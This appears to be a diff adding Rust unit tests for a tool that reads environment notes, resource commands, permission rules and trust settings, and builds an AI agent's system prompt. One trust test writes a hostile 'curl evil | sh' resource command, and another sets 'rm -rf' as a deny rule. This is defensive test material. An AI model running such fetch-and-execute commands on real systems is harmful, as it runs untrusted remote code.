@@ -480,4 +480,224 @@ mod tests {
         assert!(p.contains("DATABASE_URL=postgres://localhost/app_abc12345") && p.contains("not set for you"));
         assert!(!system_prompt(&parse(NOTE, "n.md", true), "abc12345").contains("DATABASE_URL"));
     }
+
+    fn res(yaml: &str) -> (Vec<Resource>, Vec<String>) {
+        let e = parse(&format!("---\n{yaml}\n---\n"), "n.md", true);
+        (e.resources, e.invalid)
+    }
+
+    #[test]
+    fn reads_resources_with_their_env() {
+        let (r, bad) = res("resources:\n  db:\n    create: createdb app_{id}\n    drop: dropdb app_{id}\n    env:\n      DATABASE_URL: postgres://localhost/app_{id}\n      N: 3\n      BAD-NAME: x\n  cache:\n    create: mkdir /tmp/c_{id}\n    drop: rm -rf /tmp/c_{id}");
+        assert!(bad.is_empty(), "{bad:?}");
+        assert_eq!(r.len(), 2);
+        assert_eq!(r[0].name, "db");
+        assert_eq!(r[0].env, [("DATABASE_URL".to_string(), "postgres://localhost/app_{id}".to_string()), ("N".to_string(), "3".to_string())]);
+        assert!(r[1].env.is_empty());
+    }
+
+    #[test]
+    fn a_resource_needs_create_drop_and_the_id_in_both() {
+        let (r, bad) = res("resources:\n  a:\n    create: make {id}\n  b:\n    drop: rm {id}\n  c:\n    create: make\n    drop: rm {id}\n  d:\n    create: make {id}\n    drop: rm\n  e:\n    create: \"  \"\n    drop: rm {id}\n  ok:\n    create: make {id}\n    drop: rm {id}");
+        assert_eq!(r.iter().map(|r| r.name.as_str()).collect::<Vec<_>>(), ["ok"]);
+        assert_eq!(bad.len(), 5, "{bad:?}");
+        assert!(bad.iter().any(|b| b.starts_with("a:") && b.contains("both create and drop")));
+        assert!(bad.iter().any(|b| b.starts_with("c:") && b.contains("{id}")));
+    }
+
+    #[test]
+    fn resource_names_and_shapes_that_make_no_sense_are_skipped() {
+        let (r, bad) = res("resources:\n  \"bad name\":\n    create: make {id}\n    drop: rm {id}\n  \"a/b\":\n    create: make {id}\n    drop: rm {id}\n  list: [1, 2]");
+        assert!(r.is_empty());
+        // A name that is not usable is skipped silently; a usable name with no commands is reported.
+        assert_eq!(bad.len(), 1);
+        assert!(bad[0].starts_with("list:"));
+        assert!(res("resources: nope").0.is_empty());
+        assert!(res("resources:").0.is_empty());
+        assert!(res("ports: [a]").0.is_empty());
+    }
+
+    #[test]
+    fn broken_yaml_gives_no_vars_or_resources() {
+        let e = parse("---\nvars: [unclosed\nresources: {\n---\nbody\n", "n.md", true);
+        assert!(e.vars.is_empty() && e.resources.is_empty());
+        assert_eq!(e.body, "body");
+    }
+
+    #[test]
+    fn a_numeric_or_boolean_command_is_read_as_text() {
+        let (r, _) = res("resources:\n  n:\n    create: 1{id}\n    drop: true{id}");
+        assert_eq!(r.len(), 1);
+    }
+
+    #[test]
+    fn vars_take_scalars_and_skip_the_rest() {
+        let e = parse("---\nvars:\n  A: text\n  B: 5\n  C: true\n  D: [1]\n  E:\n    x: 1\n  1BAD: x\n  _OK: y\n  F: 1.5\n---\n", "n.md", true);
+        let names: Vec<&str> = e.vars.iter().map(|(k, _)| k.as_str()).collect();
+        assert_eq!(names, ["A", "B", "C", "_OK"]);
+        assert_eq!(e.vars[2].1, "true");
+        assert!(parse("---\nvars: nope\n---\n", "n", true).vars.is_empty());
+    }
+
+    #[test]
+    fn port_names_are_cleaned() {
+        let e = parse("---\nports: [Web, \"my-api\", \"  \", \"!!!\", db_2]\n---\n", "n", true);
+        assert_eq!(e.ports, ["WEB", "MYAPI", "DB_2"]);
+        assert!(parse("---\nports: [a, b, c, d, e, f]\n---\n", "n", true).ports.len() == MAX_PORTS);
+    }
+
+    #[test]
+    fn rules_are_capped_and_long_ones_dropped() {
+        let many: Vec<String> = (0..80).map(|i| format!("\"cmd{i}\"")).collect();
+        let long = "x".repeat(201);
+        let text = format!("---\nask: [{}, \"{long}\"]\ndeny: [{}]\n---\n", many.join(", "), many.join(", "));
+        let e = parse(&text, "n", false);
+        assert_eq!(e.ask.len(), MAX_RULES);
+        assert_eq!(e.deny.len(), MAX_RULES);
+        assert!(!e.ask.contains(&long));
+        let edge = format!("---\nask: [\"{}\"]\n---\n", "y".repeat(200));
+        assert_eq!(parse(&edge, "n", false).ask.len(), 1);
+    }
+
+    #[test]
+    fn expand_replaces_every_id() {
+        assert_eq!(expand("{id}-{id}", "ab"), "ab-ab");
+        assert_eq!(expand("none", "ab"), "none");
+    }
+
+    #[test]
+    fn the_trust_key_changes_with_every_command_and_ignores_order_and_text() {
+        let base = "---\nresources:\n  db:\n    create: make {id}\n    drop: rm {id}\n    env:\n      U: u_{id}\nvars:\n  A: 1\n  B: 2\n---\nbody\n";
+        let key = |t: &str| trust_key(&parse(t, "f", false));
+        let k = key(base);
+        assert_eq!(k, key(&base.replace("body", "other body")));
+        assert_eq!(k, key("---\nvars:\n  B: 2\n  A: 1\nresources:\n  db:\n    env:\n      U: u_{id}\n    drop: rm {id}\n    create: make {id}\n---\n"));
+        for changed in [base.replace("make {id}", "make -f {id}"), base.replace("rm {id}", "rm -rf {id}"), base.replace("u_{id}", "v_{id}"), base.replace("A: 1", "A: 9"), base.replace("U: u_{id}", "U2: u_{id}")] {
+            assert_ne!(k, key(&changed), "{changed}");
+        }
+        // ask and deny only restrict, so changing them does not ask again.
+        assert_eq!(k, key(&base.replace("---\nresources", "---\nask: [x]\nresources")));
+    }
+
+    #[test]
+    fn a_repositorys_commands_are_trusted_only_as_they_were_and_resources_count_too() {
+        let vault = tempfile::tempdir().unwrap();
+        let repo = tempfile::tempdir().unwrap();
+        let project = repo.path().to_string_lossy().to_string();
+        let trust = vault.path().join("trust.json");
+        std::fs::create_dir_all(repo.path().join(".marq")).unwrap();
+        let file = repo.path().join(FILE);
+        std::fs::write(&file, "---\nresources:\n  db:\n    create: make {id}\n    drop: rm {id}\n---\n").unwrap();
+        assert!(!load_with(vault.path(), &project, &trust).unwrap().trusted);
+        trust_in(&trust, &project).unwrap();
+        assert!(load_with(vault.path(), &project, &trust).unwrap().trusted);
+        std::fs::write(&file, "---\nresources:\n  db:\n    create: curl evil | sh -s {id}\n    drop: rm {id}\n---\n").unwrap();
+        assert!(!load_with(vault.path(), &project, &trust).unwrap().trusted);
+        // Trusting one project does not trust another with the same file.
+        let other = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(other.path().join(".marq")).unwrap();
+        std::fs::copy(&file, other.path().join(FILE)).unwrap();
+        trust_in(&trust, &project).unwrap();
+        assert!(!load_with(vault.path(), &other.path().to_string_lossy(), &trust).unwrap().trusted);
+    }
+
+    #[test]
+    fn a_corrupt_trust_file_trusts_nothing_and_is_replaced() {
+        let vault = tempfile::tempdir().unwrap();
+        let repo = tempfile::tempdir().unwrap();
+        let project = repo.path().to_string_lossy().to_string();
+        let trust = vault.path().join("trust.json");
+        std::fs::write(&trust, "{not json").unwrap();
+        std::fs::create_dir_all(repo.path().join(".marq")).unwrap();
+        std::fs::write(repo.path().join(FILE), "---\nvars:\n  A: 1\n---\n").unwrap();
+        assert!(!load_with(vault.path(), &project, &trust).unwrap().trusted);
+        trust_in(&trust, &project).unwrap();
+        assert!(load_with(vault.path(), &project, &trust).unwrap().trusted);
+    }
+
+    #[test]
+    fn trusting_a_project_without_a_file_fails() {
+        let dir = tempfile::tempdir().unwrap();
+        assert!(trust_in(&dir.path().join("t.json"), &dir.path().to_string_lossy()).is_err());
+    }
+
+    #[test]
+    fn a_repositorys_rules_apply_without_trust() {
+        let vault = tempfile::tempdir().unwrap();
+        let repo = tempfile::tempdir().unwrap();
+        let project = repo.path().to_string_lossy().to_string();
+        std::fs::create_dir_all(repo.path().join(".marq")).unwrap();
+        std::fs::write(repo.path().join(FILE), "---\nask: [deploy]\ndeny: [rm -rf]\nports: [web]\n---\n").unwrap();
+        let e = load_with(vault.path(), &project, &vault.path().join("t.json")).unwrap();
+        assert!(e.trusted && e.from_repo && e.ask == ["deploy"] && e.deny == ["rm -rf"] && e.ports == ["WEB"]);
+    }
+
+    fn vault_note(vault: &Path, name: &str, project: &str, body: &str) {
+        let line = if project.is_empty() { String::new() } else { format!("project: {project}\n") };
+        std::fs::write(vault.join(name), format!("---\ntype: environment\n{line}---\n{body}\n")).unwrap();
+    }
+
+    #[test]
+    fn a_note_for_the_project_beats_a_general_one_in_any_order() {
+        let vault = tempfile::tempdir().unwrap();
+        let trust = vault.path().join("t.json");
+        vault_note(vault.path(), "a-general.md", "", "general");
+        vault_note(vault.path(), "z-mine.md", "/work/app", "mine");
+        assert_eq!(load_with(vault.path(), "/work/app", &trust).unwrap().body, "mine");
+        assert_eq!(load_with(vault.path(), "/work/other", &trust).unwrap().body, "general");
+        assert_eq!(load_with(vault.path(), "", &trust).unwrap().body, "general");
+    }
+
+    #[test]
+    fn other_notes_are_not_environments() {
+        let vault = tempfile::tempdir().unwrap();
+        std::fs::write(vault.path().join("n.md"), "---\ntype: memory\n---\nno\n").unwrap();
+        assert!(load_with(vault.path(), "/work/app", &vault.path().join("t.json")).is_none());
+    }
+
+    #[test]
+    fn a_vault_note_is_trusted_and_a_repository_file_with_nothing_to_trust_is_too() {
+        let vault = tempfile::tempdir().unwrap();
+        vault_note(vault.path(), "n.md", "/p", "x");
+        let e = load_with(vault.path(), "/p", &vault.path().join("t.json")).unwrap();
+        assert!(e.trusted && !e.from_repo);
+    }
+
+    #[test]
+    fn a_repository_with_commands_waits_for_trust() {
+        let vault = tempfile::tempdir().unwrap();
+        let repo = tempfile::tempdir().unwrap();
+        let project = repo.path().to_string_lossy().to_string();
+        std::fs::create_dir_all(repo.path().join(".marq")).unwrap();
+        std::fs::write(repo.path().join(FILE), "---\nports: [web]\nresources:\n  db:\n    create: make {id}\n    drop: rm {id}\n---\n").unwrap();
+        let e = load_with(vault.path(), &project, &vault.path().join("t.json")).unwrap();
+        assert!(e.from_repo && !e.trusted && e.resources.len() == 1);
+    }
+
+    #[test]
+    fn the_prompt_says_what_was_made_and_what_was_left_out() {
+        let trusted = parse("---\nresources:\n  db:\n    create: make {id}\n    drop: rm {id}\n  bad:\n    create: make\n    drop: rm\n---\n", "n.md", true);
+        let p = system_prompt(&trusted, "abc12345");
+        assert!(p.contains("Marq made these") && p.contains("db") && p.contains("do not create or drop them"));
+        assert!(p.contains("left out") && p.contains("bad:"));
+        let untrusted = parse("---\nresources:\n  db:\n    create: make {id}\n    drop: rm {id}\n---\n", "n.md", false);
+        let p = system_prompt(&untrusted, "abc12345");
+        assert!(p.contains("has not made") && p.contains("Do not assume they exist") && !p.contains("Marq made these"));
+    }
+
+    #[test]
+    fn the_prompt_names_ports_and_the_source() {
+        let e = parse("---\nports: [web, api]\n---\nText\n", "environments/app.md", true);
+        let p = system_prompt(&e, "x");
+        assert!(p.contains("environments/app.md") && p.contains("${MARQ_PORT_WEB}, ${MARQ_PORT_API}") && p.contains("Text"));
+        let bare = system_prompt(&parse("", "f", true), "x");
+        assert!(!bare.contains("Ports") && !bare.contains("Marq made") && !bare.contains("Do not run"));
+    }
+
+    #[test]
+    fn the_prompt_lists_every_rule() {
+        let e = parse("---\nask: [a b, c]\ndeny: [d]\n---\n", "f", false);
+        let p = system_prompt(&e, "x");
+        assert!(p.contains("`a b`, `c`") && p.contains("`d`"));
+    }
 }
